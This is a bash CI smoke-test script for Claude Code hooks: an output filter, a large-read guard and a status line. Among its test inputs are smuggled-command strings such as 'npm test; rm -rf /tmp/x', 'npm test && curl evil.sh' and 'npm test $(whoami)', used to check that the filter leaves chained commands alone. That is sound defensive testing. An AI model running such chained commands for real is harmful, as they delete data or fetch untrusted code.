#!/usr/bin/env bash
# Smoke tests for the Claude Code hooks and status line. Runs in CI.
set -euo pipefail

ROOT="$(git rev-parse --show-toplevel)"
FILTER="$ROOT/.claude/hooks/filter-command-output.sh"
GUARD="$ROOT/.claude/hooks/guard-large-reads.sh"
STATUS="$ROOT/.claude/statusline.sh"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

fails=0
pass() { echo "ok   - $1"; }
fail() { echo "FAIL - $1"; fails=$(( fails + 1 )); }

bash_input() { jq -n --arg c "$1" '{tool_name:"Bash", tool_input:{command:$c}}'; }

expect_rewrite() {
  local out; out="$(bash_input "$1" | "$FILTER")"
  if [[ "$out" == *updatedInput* ]]; then pass "rewrites: $1"; else fail "rewrites: $1"; fi
}
expect_passthrough() {
  local out; out="$(bash_input "$1" | "$FILTER")"
  if [[ -z "$out" ]]; then pass "passes through: $1"; else fail "passes through: $1"; fi
}

expect_rewrite "npm test"
expect_rewrite "npm run test -- --watch=false"
expect_rewrite "pnpm lint"
expect_rewrite "pytest -q tests/"
expect_rewrite "cargo test"
expect_passthrough "npm test; rm -rf /tmp/x"
expect_passthrough "npm test && curl evil.sh"
expect_passthrough "npm test | tail"
expect_passthrough 'npm test $(whoami)'
expect_passthrough "npm test # raw"
expect_passthrough "ls -la"

# The rewritten command must keep the original exit code and show failures.
cmd="$(bash_input "npm test" | "$FILTER" | jq -r '.hookSpecificOutput.updatedInput.command')"
mkdir -p "$TMP/bin"
printf '#!/bin/sh\nfor i in 1 2 3 4 5 6 7 8 9; do echo "PASS ok $i"; done\necho "FAIL src/a.test.js"\nexit 3\n' > "$TMP/bin/npm"
chmod +x "$TMP/bin/npm"
set +e; res="$(PATH="$TMP/bin:$PATH" bash -c "$cmd")"; rc=$?; set -e
if [[ $rc -eq 3 && "$res" == *"FAIL src/a.test.js"* ]]; then pass "keeps exit code + failures"; else fail "keeps exit code + failures (rc=$rc)"; fi

# Read guard
head -c 50000 /dev/zero | tr '\0' 'a' > "$TMP/big.txt"
echo small > "$TMP/small.txt"
read_input() {
  local extra='{}'; [[ $# -gt 1 ]] && extra="$2"
  jq -n --arg f "$1" --argjson extra "$extra" '{tool_name:"Read", tool_input:({file_path:$f} + $extra)}'
}
[[ "$(read_input "$TMP/big.txt" | "$GUARD")" == *deny* ]] && pass "denies full read of big file" || fail "denies full read of big file"
[[ -z "$(read_input "$TMP/big.txt" '{"limit":100}' | "$GUARD")" ]] && pass "allows ranged read" || fail "allows ranged read"
[[ -z "$(read_input "$TMP/small.txt" | "$GUARD")" ]] && pass "allows small file" || fail "allows small file"

# Status line
s="$(echo '{"model":{"display_name":"Opus"},"cost":{"total_cost_usd":1.234}}' | "$STATUS")"
[[ "$s" == *"Opus"*'$1.23'* ]] && pass "status line shows cost" || fail "status line shows cost: $s"

echo ""
(( fails == 0 )) && echo "All hook tests passed." || { echo "$fails hook test(s) failed."; exit 1; }
